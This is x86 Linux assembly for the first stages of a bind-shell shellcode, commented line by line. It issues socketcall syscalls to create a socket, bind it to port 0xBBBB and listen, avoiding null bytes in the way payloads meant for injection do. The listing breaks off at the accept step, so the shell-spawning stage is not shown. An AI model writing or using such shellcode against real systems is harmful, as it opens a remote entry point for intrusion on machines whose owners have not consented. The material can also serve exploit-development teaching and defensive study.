BITS 32
section .text
global _start
_start:
    xor eax, eax            ; clear eax
    xor ebx, ebx            ; clear ebx
    xor edx, edx            ; clear edx
    
    ; server = socket (2, 1, 0)
    push eax                ; third arg to socket: 0
    push byte 0x1           ; second arg to socket: 1
    push byte 0x2           ; first arg to socket: 2
    mov ecx, esp            ; set addr of array as 2nd arg to socketcall
    inc bl                  ; set first arg to socketcall to # 1
    mov al, 102             ; call socketcall # 1: SYS_SOCKET
    int 0x80                ; jump into kernel mode, execute the syscall
    mov esi, eax            ; store the return value (eax) into esi (server)
    
    ; bind(server, (struct sockadd *) &serv_addr, 0x10)
    push edx                ; still zero, terminate the next value pushed
    push long 0xBBBB02BB    ; build struct:port, sin.family:02, & and 2 bytes:BB
    mov ecx, esp            ; mov addr struct (on stack) to ecx
    push byte 0x10          ; begin the bind args, push 16 (size) on stack
    push ecx                ; save address of struct back on stack
    push esi                ; save server file descriptor (now in esi) to stack
    mov ecx, esp            ; set addr of array as 2 arg to socketcall
    inc bl                  ; set bl to #2, first arg of socket call
    mov al, 102             ; call socketcall # 2: SYS_BIND
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; listen(server, 0)
    push edx                ; still zero, used to terminate the next value pushed
    push esi                ; file descriptor for server (esi) pushed to stack
    mov ecx, esp            ; set addr of array as 2nd arg to socketcall
    mov bl, 0x4             ; move 4 into bl, first arg of socketcall
    mov al, 102             ; call socketcall #4: SYS_LISTEN
    int 0x80                ; jump into kernel mode, execute the syscall
    
    ; client = accept(server, 0, 0)
    
    
